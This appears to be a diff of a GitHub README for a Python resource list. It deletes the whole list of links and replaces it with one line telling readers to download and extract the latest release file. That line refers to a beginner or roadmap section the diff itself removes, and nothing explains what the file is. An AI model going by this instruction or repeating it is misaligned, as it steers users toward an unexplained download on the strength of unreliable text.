-- [commitizen](https://commitizen-tools.github.io/commitizen/)
-
----
-
-## Type Hints & Static Analysis
-
-- [mypy](https://mypy-lang.org/) *(Standard type checker)*
-- [pyright](https://microsoft.github.io/pyright/) *(Microsoft, used in Pylance)*
-- [Pydantic](https://docs.pydantic.dev/) *(Runtime validation)*
-- [beartype](https://beartype.readthedocs.io/) *(Runtime type checking)*
-- [typeguard](https://typeguard.readthedocs.io/)
-- [typing_extensions](https://typing-extensions.readthedocs.io/)
-- [Python Type Hints Cheat Sheet](https://mypy.readthedocs.io/en/stable/cheat_sheet_py3.html)
-
----
-
-## Cheat Sheets & Quick References
-
-- [Python Cheat Sheet - pythoncheatsheet.org](https://www.pythoncheatsheet.org/)
-- [Real Python Cheat Sheets](https://realpython.com/python-cheat-sheet/)
-- [Python 3 Type Hints Cheat Sheet](https://mypy.readthedocs.io/en/stable/cheat_sheet_py3.html)
-- [Pandas Cheat Sheet](https://pandas.pydata.org/Pandas_Cheat_Sheet.pdf)
-- [NumPy Cheat Sheet](https://numpy.org/doc/stable/user/numpy-for-matlab-users.html)
-- [Python String Formatting](https://pyformat.info/)
-- [f-Strings Cheat Sheet](https://fstring.help/)
-- [Regular Expressions in Python](https://www.pythex.org/)
-- [Python itertools Recipes](https://docs.python.org/3/library/itertools.html#itertools-recipes)
-- [Comprehensions Guide](https://realpython.com/list-comprehension-python/)
-
----
-
-## Visualizers & Tools
-
-- [Python Tutor](https://pythontutor.com/) *(Step-by-step execution)*
-- [Thonny IDE](https://thonny.org/) *(Beginner-friendly with debugger)*
-- [Online Python - Trinket](https://trinket.io/python)
-- [Replit](https://replit.com/)
-- [Regex101 - Python flavor](https://regex101.com/)
-- [AST Explorer](https://astexplorer.net/)
-- [PyPI Stats](https://pypistats.org/)
-- [Sourcegraph](https://sourcegraph.com/) *(Code search)*
-- [Compiler Explorer (Python)](https://godbolt.org/)
-
----
-
-## IDEs & Extensions
-
-### IDEs
-
-- [PyCharm](https://www.jetbrains.com/pycharm/) *(Best Python IDE)*
-- [VS Code](https://code.visualstudio.com/)
-- [Spyder](https://www.spyder-ide.org/) *(Scientific Python)*
-- [Jupyter](https://jupyter.org/)
-- [Zed](https://zed.dev/)
-
-### VS Code Extensions
-
-- [Python Extension - Microsoft](https://marketplace.visualstudio.com/items?itemName=ms-python.python)
-- [Pylance](https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance)
-- [Ruff Extension](https://marketplace.visualstudio.com/items?itemName=charliermarsh.ruff)
-- [Black Formatter](https://marketplace.visualstudio.com/items?itemName=ms-python.black-formatter)
-- [Python Docstring Generator](https://marketplace.visualstudio.com/items?itemName=njpwerner.autodocstring)
-- [Jupyter Extension](https://marketplace.visualstudio.com/items?itemName=ms-toolsai.jupyter)
-- [Python Test Explorer](https://marketplace.visualstudio.com/items?itemName=LittleFoxTeam.vscode-python-test-adapter)
-- [GitLens](https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens)
-
----
-
-## GitHub Repositories
-
-### Learning & Reference
-
-- [TheAlgorithms/Python](https://github.com/TheAlgorithms/Python)
-- [trekhleb/javascript-algorithms (Python port)](https://github.com/TheAlgorithms/Python)
-- [satwikkansal/wtfpython](https://github.com/satwikkansal/wtfpython) *(Python gotchas)*
-- [30-Days-Of-Python](https://github.com/Asabeneh/30-Days-Of-Python)
-- [Python Patterns](https://github.com/faif/python-patterns)
-- [Hitchhiker's Guide to Python](https://github.com/realpython/python-guide)
-- [Awesome Python](https://github.com/vinta/awesome-python)
-- [Awesome Python Books](https://github.com/Junnplus/awesome-python-books)
-
-### Project Ideas & Templates
-
-- [Cookiecutter](https://github.com/cookiecutter/cookiecutter)
-- [Cookiecutter Django](https://github.com/cookiecutter/cookiecutter-django)
-- [FastAPI Full Stack Template](https://github.com/fastapi/full-stack-fastapi-template)
-- [Python Project Template - BestPractice](https://github.com/johnthagen/python-blueprint)
-- [PyPackage Cookiecutter](https://github.com/audreyfeldroy/cookiecutter-pypackage)
-
----
-
-## Blogs & Newsletters
-
-- [Real Python](https://realpython.com/)
-- [Python Weekly](https://www.pythonweekly.com/)
-- [PyCoder's Weekly](https://pycoders.com/)
-- [Mouse vs Python - Mike Driscoll](https://www.blog.pythonlibrary.org/)
-- [Trey Hunner's Blog](https://treyhunner.com/blog/)
-- [ArjanCodes Blog](https://arjancodes.com/)
-- [Brett Cannon's Blog](https://snarky.ca/)
-- [Ned Batchelder's Blog](https://nedbatchelder.com/)
-- [Python Insider - PSF Blog](https://blog.python.org/)
-- [Full Stack Python Blog](https://www.fullstackpython.com/blog.html)
-- [Dan Bader - dbader.org](https://dbader.org/)
-- [Towards Data Science - Python](https://towardsdatascience.com/tagged/python)
-
----
-
-## Podcasts
-
-- [Talk Python To Me](https://talkpython.fm/)
-- [Python Bytes](https://pythonbytes.fm/)
-- [The Real Python Podcast](https://realpython.com/podcasts/rpp/)
-- [Test & Code](https://testandcode.com/)
-- [Podcast.__init__](https://www.pythonpodcast.com/)
-- [Changelog - Python episodes](https://changelog.com/podcast)
-
----
-
-## Communities & Forums
-
-### Online Communities
-
-- [r/Python](https://www.reddit.com/r/Python/)
-- [r/learnpython](https://www.reddit.com/r/learnpython/)
-- [r/pythoncoding](https://www.reddit.com/r/pythoncoding/)
-- [Python Discord](https://pythondiscord.com/)
-- [Stack Overflow - Python](https://stackoverflow.com/questions/tagged/python)
-- [Python Forum](https://python-forum.io/)
-- [Real Python Community Slack](https://realpython.com/community/)
-- [PySlackers](https://pyslackers.com/)
-- [Indie Python](https://indiepython.com/)
-
-### Events & Conferences
-
-- [PyCon US](https://us.pycon.org/)
-- [EuroPython](https://europython.eu/)
-- [PyCon India](https://in.pycon.org/)
-- [PyData](https://pydata.org/)
-- [SciPy Conference](https://conference.scipy.org/)
-
----
-
-## Key Articles & Essays
-
-### Python Philosophy & Best Practices
-
-- [The Zen of Python - PEP 20](https://peps.python.org/pep-0020/)
-- [PEP 8 — Style Guide](https://peps.python.org/pep-0008/)
-- [Pythonic Code - Real Python](https://realpython.com/learning-paths/writing-pythonic-code/)
-- [Stop Writing Classes - Jack Diederich](https://www.youtube.com/watch?v=o9pEzgHorH0)
-- [Design Patterns in Python - ArjanCodes](https://www.youtube.com/watch?v=pTB0EiLXUC8)
-- [Python Anti-Patterns](https://docs.quantifiedcode.com/python-anti-patterns/)
-
-### Performance & Internals
-
-- [Python's GIL — Real Python](https://realpython.com/python-gil/)
-- [Memory Management in Python](https://realpython.com/python-memory-management/)
-- [Faster CPython Project](https://github.com/faster-cpython/ideas)
-- [Python 3.12 Free-Threaded Mode](https://docs.python.org/3.13/whatsnew/3.13.html)
-- [Why Python is Slow — Jake VanderPlas](https://jakevdp.github.io/blog/2014/05/09/why-python-is-slow/)
-
-### Architecture
-
-- [Architecture Patterns with Python (Free Book)](https://www.cosmicpython.com/)
-- [Clean Architecture in Python - ArjanCodes](https://www.youtube.com/watch?v=qJbSM3yHPUk)
-- [Dependency Injection in Python](https://python-dependency-injector.ets-labs.org/)
-
----
-
-## Practice Platforms
-
-### Python-Specific
-
-- [PyBites](https://codechalleng.es/) *(Python bite exercises)*
-- [Exercism Python Track](https://exercism.org/tracks/python)
-- [CheckiO](https://checkio.org/)
-- [Edabit Python Challenges](https://edabit.com/challenges/python3)
-- [Python Morsels](https://www.pythonmorsels.com/)
-
-### General Coding
-
-- [LeetCode](https://leetcode.com/)
-- [HackerRank Python](https://www.hackerrank.com/domains/python)
-- [Codewars](https://www.codewars.com/)
-- [Project Euler](https://projecteuler.net/)
-- [Advent of Code](https://adventofcode.com/)
-
----
-
-## Startup Programs & Credits
-
-### Cloud (Python-friendly)
-
-- [AWS Activate](https://aws.amazon.com/activate/) *(Lambda, EC2, S3)*
-- [Google Cloud for Startups](https://cloud.google.com/developers/startups)
-- [Microsoft for Startups](https://startups.microsoft.com/) *(Azure Functions)*
-- [DigitalOcean Hatch](https://www.digitalocean.com/hatch/)
-- [Heroku for Startups](https://www.heroku.com/accelerate)
-- [Railway](https://railway.app/) *(Easy Python deployment)*
-- [Render](https://render.com/)
-- [Fly.io](https://fly.io/)
-
-### Tools & Services
-
-- [JetBrains OSS License](https://www.jetbrains.com/community/opensource/) *(Free PyCharm for OSS)*
-- [GitHub for Startups](https://github.com/solutions/startups)
-- [Sentry for Startups](https://sentry.io/for/startups/)
-- [Datadog for Startups](https://www.datadoghq.com/partner/startups/)
-
----
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Here's how you can help:
-
-1. **Add a Resource** — Found a useful library, course, or article? Submit a pull request!
-2. **Fix Broken Links** — Help keep the list current
-3. **Improve Descriptions** — Make resources easier to understand
-4. **Suggest Categories** — Help us organize better
-
-### Contribution Guidelines
-
-- Ensure the resource is relevant to Python development
-- Provide a working link
-- Add a brief description if needed
-- Place it in the appropriate category
-- Check for duplicates before submitting
-
----
-
-## Sponsorship
-
-If you find this repository valuable and want to support its growth:
-
-- Sponsor this project to help maintain and expand the collection
-- Partner with us to feature high quality tools for founders
-- Reach out for collaborations and ecosystem partnerships
-
-For sponsorship or partnership inquiries, connect via X:  
-[Avinash Singh](https://x.com/AvinashSingh_20)
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-##  Acknowledgments
-
-This repository is maintained by [Avinash Singh](https://x.com/AvinashSingh_20) Special thanks to all contributors who have helped curate and maintain this collection.
-
-## 💬 Community & Support
-
-- Star this repo to show your support
-- Share it with fellow founders and entrepreneurs
-- Follow for updates as we add new resources
-- Join the discussion in [Issues](https://github.com/avinash201199/Python-KIT/issues)
-
----
-
-**Made with ❤️ by [Avinash Singh](https://x.com/AvinashSingh_20)**
+Open the release page, download the latest file, extract it if needed, and start with the beginner or roadmap section
